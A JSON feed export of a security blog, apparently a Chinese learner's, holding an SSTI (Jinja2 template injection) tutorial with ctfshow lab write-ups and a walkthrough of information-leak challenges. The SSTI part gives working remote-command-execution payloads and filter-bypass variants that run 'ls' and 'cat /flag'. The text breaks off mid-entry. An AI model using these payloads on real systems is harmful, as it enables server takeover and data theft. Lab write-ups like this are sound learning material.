{
    "version": "https://jsonfeed.org/version/1",
    "title": "Hexo • All posts by \"web\" tag",
    "description": "",
    "home_page_url": "https://nnnpc.github.io",
    "items": [
        {
            "id": "https://nnnpc.github.io/2024/04/16/SSTI%E5%AD%A6%E4%B9%A0/",
            "url": "https://nnnpc.github.io/2024/04/16/SSTI%E5%AD%A6%E4%B9%A0/",
            "title": "SSTI学习",
            "date_published": "2024-04-16T05:58:19.033Z",
            "content_html": "<h1 id=\"ssti学习\"><a class=\"markdownIt-Anchor\" href=\"#ssti学习\">#</a> SSTI 学习</h1>\n<p>SSTI (Server-Side Template Injection) 又称服务器端模板注入</p>\n<p>用户的输入先进入 Controller 控制器，然后根据请求类型和请求的指令发送给对应 Model 业务模型进行业务逻辑判断，数据库存取，最后把结果返回给 View 视图层，经过模板渲染展示给用户</p>\n<p>模板通俗来讲就是拥有一个固定的格式，等着进行填充</p>\n<h2 id=\"漏洞原理\"><a class=\"markdownIt-Anchor\" href=\"#漏洞原理\">#</a> 漏洞原理</h2>\n<p>服务端在接收到用户的输入之后，并未做出有效的处理而导致用户可以输入一些攻击语句让模板引擎进行编译渲染，执行了攻击语句，从而达到了攻击者需要的效果</p>\n<h2 id=\"继承关系\"><a class=\"markdownIt-Anchor\" href=\"#继承关系\">#</a> 继承关系</h2>\n<p>接下来说说该漏洞点该如何进行利用，最主要的就是搞清楚继承的关系，接着就是绕过。因此，搞清楚继承关系对后续的注入有很大的帮助</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class A:</span><br><span class=\"line\"></span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\">class B(A):</span><br><span class=\"line\"></span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\">class C(B):</span><br><span class=\"line\"></span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\">class D(C):</span><br><span class=\"line\"></span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\">f = C()</span><br><span class=\"line\"></span><br><span class=\"line\">print(f)</span><br></pre></td></tr></table></figure>\n<p>这里 B 继承了 A，C 又继承了 B，以次类推，并且创建了 C 的对象 f，这里介绍第一个魔术方法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__)</span><br></pre></td></tr></table></figure>\n<p>该魔术方法可以用来找到该对象当前所在的类</p>\n<p>接下来返回到它的父类也就是 B，所用的魔术方法为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__.__base__)</span><br></pre></td></tr></table></figure>\n<p>当然，如果想再返回 B 的父类也就是 A，再跟上一个 base 即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__.__base__.__base__)</span><br></pre></td></tr></table></figure>\n<p>那么疑问来了，在这里 A 并没有被设定成谁的子类，如果再返回他的父类会到哪呢？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__.__base__.__base__.__base__)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205150431556.png\" alt=\"\"></p>\n<p>发现 A 类的父类是 object 类，当一个类没有显式指定它是继承某个类的时候，它就会默认继承 object 类</p>\n<p>在这里能看到从一个子类到父类的过程是用 base 魔术方法，但这样比较冗长，可以直接使用 mro 魔术方法来列出所有父类</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__.__mro__)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205151555259.png\" alt=\"\"></p>\n<p>再和数组一样跟上下标来选择自己需要的父类在这里 object 就是 3，因此</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__.__mro__[3])</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205151708060.png\" alt=\"\"></p>\n<p>到这里为止，我们拿到了 object 类，自然是可以查找到 object 类中的所有子类，来选取可以利用的子类进行 rce。使用 subclasses 魔术方法来列出当前所在类的所有子类</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__.__mro__[3].__subclasses__())</span><br></pre></td></tr></table></figure>\n<p>同样通过下标来选择需要用到的子类，这里用到 &lt; class<br>\n‘os._wrap_close’&gt;，在我这是 139</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__.__mro__[3].__subclasses__()[139])</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205152724475.png\" alt=\"\"></p>\n<p>成功拿到 os 子类，接下来使用魔术方法 init 进行一下初始化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__.__mro__[3].__subclasses__()[139].__init__)</span><br></pre></td></tr></table></figure>\n<p>接着使用魔术方法 globals 获取 function 所处空间下可使用的 module、方法以及所有变量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__.__mro__[3].__subclasses__()[139].__init__.__globals__)</span><br></pre></td></tr></table></figure>\n<p>接着用 read 来读取子进程的输出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__.__mro__[3].__subclasses__()[139].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls&#x27;).read())</span><br></pre></td></tr></table></figure>\n<p>这样就是一条完整的注入 payload 了，进行了远程 rce，执行了 ls 命令</p>\n<p><strong>总结：简单来说，就是在接收用户输入时没有做好安全过滤，导致在模板渲染时执行了用户的恶意输入，造成了注入漏洞。而我们利用这一漏洞使用魔术方法调回 object 类，并使用它的可执行的子类来进行 rce</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__class__   ：返回类型所属的对象</span><br><span class=\"line\"></span><br><span class=\"line\">__mro__     ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class=\"line\"></span><br><span class=\"line\">__base__   ：返回该对象所继承的父类</span><br><span class=\"line\"></span><br><span class=\"line\">__mro__     ：返回该对象的所有父类</span><br><span class=\"line\"></span><br><span class=\"line\">__subclasses__()  获取当前类的所有子类</span><br><span class=\"line\"></span><br><span class=\"line\">__init__  类的初始化方法</span><br><span class=\"line\"></span><br><span class=\"line\">__globals__  获取function所处空间下可使用的module、方法以及所有变量</span><br></pre></td></tr></table></figure>\n<h2 id=\"实例\"><a class=\"markdownIt-Anchor\" href=\"#实例\">#</a> 实例</h2>\n<p>既然了解了漏洞原理和注入方法，那接下来就来进行实操，以下实例均来自 ctfshow 的 web 入门靶场</p>\n<h3 id=\"web361\"><a class=\"markdownIt-Anchor\" href=\"#web361\">#</a> web361</h3>\n<p>利用 name 进行 get 传参，先尝试一下漏洞是否存在，能不能被正常执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;7\\*7&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205160528509.png\" alt=\"\"></p>\n<p>成功，接下来根据之前的流程来进行 rce，先用 mro 列出所有父类</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;&quot;&quot;.__class__.__mro__&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205160730810.png\" alt=\"\"></p>\n<p>发现标号 1 即可返回到 object 类</p>\n<p>接着列出所有子类</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205160840957.png\" alt=\"\"></p>\n<p>找到 &lt;class ‘os._wrap_close’&gt; 大概在 132 左右</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132]&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205160911199.png\" alt=\"\"></p>\n<p>初始化并利用进行 rce</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205161244100.png\" alt=\"\"></p>\n<p>根目录下存在 flag，改变命令为 cat /flag 即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>总结：本题没有进行任何过滤，因此只要找到环境中的 object 的类、子类以及方法和变量所在的位置就可以</strong></p>\n<h3 id=\"web362\"><a class=\"markdownIt-Anchor\" href=\"#web362\">#</a> web362</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205162107943.png\" alt=\"\"></p>\n<p>用 361 的 payload 发现打不通了，应该是过滤了一些东西，进一步进行排查</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205162304412.png\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205162318642.png\" alt=\"\"></p>\n<p>发现是其中的 2、3 数字被过滤了，很简单，利用全角数字代替正常数字，效果是一样的，进行过滤绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[１３２].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>总结：本题过滤了数字，但只要使用同样能被执行的类型就可以实现绕过</strong></p>\n<h3 id=\"web363\"><a class=\"markdownIt-Anchor\" href=\"#web363\">#</a> web363</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205194231943.png\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205194302538.png\" alt=\"\"></p>\n<p>经过尝试可以发现，本题中单引号双引号都被过滤了，用 [] 进行代替</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205194547828.png\" alt=\"\"></p>\n<p>那么问题来了，按照原先的 payload 后面的 popen 和 ls 也需要单引号的包裹才能实现 rce，但这里明显行不通，只能换一种方法</p>\n<p>利用传参的方式将引号包裹的参数传递进去：request.args.a</p>\n<p>构造 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;&amp;a=popen&amp;b=ls</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206131731543.png\" alt=\"\"></p>\n<p>成功绕过，读取 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br></pre></td></tr></table></figure>\n<p><strong>总结：本题过滤了单引号，导致普通的 globals 跟上 popen 的方法使用不了，于是利用了传参的方法将单引号内包裹的内容进行传入实现绕过</strong></p>\n<h3 id=\"web364\"><a class=\"markdownIt-Anchor\" href=\"#web364\">#</a> web364</h3>\n<p>用上一题的 payload 是打不通了，经尝试发现是 args 被 ban 了，但传参的方法依然是可以使用的，将 args 替换成 values 能实现同样的效果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[request.values.a](request.values.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206132402520.png\" alt=\"\"></p>\n<p>成功绕过拿到 flag</p>\n<p><strong>总结：本题相比上一题就把 args<br>\nban 了，替换成 values 能实现同样的效果，成功绕过</strong></p>\n<h3 id=\"web365\"><a class=\"markdownIt-Anchor\" href=\"#web365\">#</a> web365</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206133334887.png\" alt=\"\"></p>\n<p>一开始使用 class 魔术方法时就发现中括号被增加过滤了，对象可以使用 () 等字符来代替，但是后面的 subclasses 等魔术方法都需要中括号来选择下标，这里使用<strong> getitem</strong> () 方法来代替 [] 实现绕过。</p>\n<p>使用方法举例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">前：.__subclasses__()[132]</span><br><span class=\"line\"></span><br><span class=\"line\">后：.__subclasses__().__getitem__(132)</span><br></pre></td></tr></table></figure>\n<p>能实现和中括号相同的效果，这里使用<strong> getitem</strong> () 方法来进行绕过试试（其实就是用<strong> getitem</strong> () 方法来代替 payload 中的所有 []）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.values.a)(request.values.b).read()&#125;&#125;&amp;a=popen&amp;b=ls</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206134805952.png\" alt=\"\"></p>\n<p>成功绕过，读取 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.values.a)(request.values.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br></pre></td></tr></table></figure>\n<p><strong>总结：本题增加过滤了中括号，利用 getitem () 方法来代替中括号实现绕过</strong></p>\n<h3 id=\"web366\"><a class=\"markdownIt-Anchor\" href=\"#web366\">#</a> web366</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206140444508.png\" alt=\"\"></p>\n<p>发现下划线被过滤了，那么同样需要使用传参的方法去传递<strong> class</strong> () 等魔术方法来实现对下划线的绕过，这里需要用 | attr () 来代替原先的。的写法</p>\n<p>例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">().__class__</span><br><span class=\"line\"></span><br><span class=\"line\">()|attr(&quot;__class__&quot;)</span><br></pre></td></tr></table></figure>\n<p>这两种方法所实现的效果是一样的，这里被过滤了下划线，因此利用传参的方法来构造 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;()|attr(request.values.a)&#125;&#125;&amp;a=__class__</span><br></pre></td></tr></table></figure>\n<p>完整 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;(()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(132)|attr(request.values.e)|attr(request.values.f)|attr(request.values.g)(request.values.h)(request.values.i)).read()&#125;&#125;&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=__getitem__&amp;h=popen&amp;i=cat /flag</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206144623859.png\" alt=\"\"></p>\n<p>成功绕过，但是这样的 payload 比较冗长，检查起来也比较麻烦，所以想办法精简一下</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206144819010.png\" alt=\"\"></p>\n<p>这里可以使用 lipsum 方法，跟上 globals 魔术方法能实现直接调用 os 执行命令的功能</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206145221279.png\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;lipsum.__globals__.os.popen(&#x27;cat /flag&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>修改后 pyaload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;(lipsum|attr(request.values.a)).os.popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat /flag</span><br></pre></td></tr></table></figure>\n<p>成功绕过获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206150900872.png\" alt=\"\"></p>\n<p><strong>总结：本题 ban 了下划线，那么同样需要用传参的方式传入魔术方法，用 | attr (“class”) 来等效替代了原先的.class 并同样使用 request 进行传入，这样导致 payload 十分冗长，于是利用 lipsum 跟上 globals 直接执行 os 来缩短 payload 的长度</strong></p>\n<h3 id=\"web367\"><a class=\"markdownIt-Anchor\" href=\"#web367\">#</a> web367</h3>\n<p>发现 os 被过滤了，同样传参进去进行绕过，这里需要使用 get 方法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206154410790.png\" alt=\"\"></p>\n<p><strong>总结：os 被增加过滤，使用 get 方法进行传参传入绕过限制</strong></p>\n<h3 id=\"web368\"><a class=\"markdownIt-Anchor\" href=\"#web368\">#</a> web368</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206155937380.png\" alt=\"\"></p>\n<p>这次发现连花括号都直接过滤了，使用以下方法进行包裹绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% print() %&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206155135055.png\" alt=\"\"></p>\n<p>将 367 中的 payload 修改一下，用上述绕过方法进行包裹</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;% print((lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()) %&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206155240331.png\" alt=\"\"></p>\n<p>成功绕过</p>\n<p><strong>总结：过滤了花括号，使用其他方式进行包裹绕过</strong></p>\n",
            "tags": [
                "WEB"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/CTFshow%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%861-20/",
            "url": "https://nnnpc.github.io/2024/04/16/CTFshow%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%861-20/",
            "title": "CTFshow信息收集1-20",
            "date_published": "2024-04-16T05:58:18.979Z",
            "content_html": "<h1 id=\"web1\"><a class=\"markdownIt-Anchor\" href=\"#web1\">#</a> WEB1</h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/L96JeTCRYwy86rkf.png!thumbnail\" alt=\"\"></p>\n<p>根据题目的提示注释中应该有东西</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/WDM7h81Wz3QMpJOt.png!thumbnail\" alt=\"\"></p>\n<p>f12 看看页面注释</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/CD25HG1fXrVqAKSR.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{9d212404-6419-4809-8393-5ce36e647b80}</strong></p>\n<h1 id=\"web2\"><a class=\"markdownIt-Anchor\" href=\"#web2\">#</a> <strong>WEB2</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/swqZro7BkpRFf31M.png!thumbnail\" alt=\"\"></p>\n<p>题目提示是 js 前台拦截，那么方法就是禁用 js</p>\n<p>打开环境发现 f12 打不开，去禁用 js</p>\n<p>打开新标签页面输入 about:config</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IrE6FWSDXl3AEiwL.png!thumbnail\" alt=\"\"></p>\n<p>将 true 改为 false，回到环境</p>\n<p>f12 打开获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/H9s8EsHUoBtoSNnm.png!thumbnail\" alt=\"\"></p>\n<p>c<strong>tfshow{7e3126b1-d7ad-4d77-848e-588e9a815ca9}</strong></p>\n<h1 id=\"web3\"><a class=\"markdownIt-Anchor\" href=\"#web3\">#</a> <strong>WEB3</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7qbK8gE1QMva7SHe.png!thumbnail\" alt=\"\"></p>\n<p>获得提示，打开环境进行抓包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9mY5UkPyQ4ipNR70.png!thumbnail\" alt=\"\"></p>\n<p>send to repeater</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/K80tBSMLsxu9LEpb.png!thumbnail\" alt=\"\"></p>\n<p>repeater 进行发包获得 flag</p>\n<p><strong>ctfshow{700018ef-093f-44b4-af0d-97ef01116886}</strong></p>\n<h1 id=\"web4\"><a class=\"markdownIt-Anchor\" href=\"#web4\">#</a> <strong>WEB4</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LdTC9Z0ZDXP7tE31.png!thumbnail\" alt=\"\"></p>\n<p>查看提示，在 robots 中可能有信息</p>\n<p>网址栏输入 /robots.txt</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mHB7PDwDBQT9jxNY.png!thumbnail\" alt=\"\"></p>\n<p>看到目录 /flagishere.txt，网址栏访问</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/FTiy8B8cATc2IWN6.png!thumbnail\" alt=\"\"></p>\n<p>获得 flag</p>\n<p><strong>ctfshow{567e780b-1bb6-4456-8cc5-e61b6827e37f}</strong></p>\n<h1 id=\"web5\"><a class=\"markdownIt-Anchor\" href=\"#web5\">#</a> <strong>WEB5</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yaQ2mYTmo5BBczCG.png!thumbnail\" alt=\"\"></p>\n<p>提示 phps 源码泄露，那就访问下 index.phps，可能有东西</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QudwoxVt77WxWktR.png!thumbnail\" alt=\"\"></p>\n<p>下载下来 index.phps，打开得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TkR6W3aV0G6PuO6M.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{9b549014-9c4e-46d3-8814-9828706364a0}</strong></p>\n<h1 id=\"web6\"><a class=\"markdownIt-Anchor\" href=\"#web6\">#</a> <strong>WEB6</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/zCJHmVb8KW0ouJOT.png!thumbnail\" alt=\"\"></p>\n<p>看提示证明是源码泄露，查看 /<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemlw\">www.zip</span></p>\n<p>得到压缩包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Ow2xm7uwtdljhqZB.png!thumbnail\" alt=\"\"></p>\n<p>打开 fl000g.txt 得到 flag</p>\n<p><strong>flag{flag_here}</strong></p>\n<h1 id=\"web7\"><a class=\"markdownIt-Anchor\" href=\"#web7\">#</a> WEB7</h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/q90I0F3UyFUO4rpJ.png!thumbnail\" alt=\"\"></p>\n<p>提示不要部署到生产环境</p>\n<p>访问 /.git 目录</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LptTkrZDuYpmul9Y.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/o7tXDKpKDuzJHUE9.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{c860b2e6-3208-487f-8351-f0d5e31a59f8}</strong></p>\n<h1 id=\"web8\"><a class=\"markdownIt-Anchor\" href=\"#web8\">#</a> <strong>WEB8</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/82D9rSzD97MbZVZ9.png!thumbnail\" alt=\"\"></p>\n<p>同样是不要部署到生产环境</p>\n<p>访问 /.svn/，得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Z9sBK9GE1z1SaBId.png!thumbnail\" 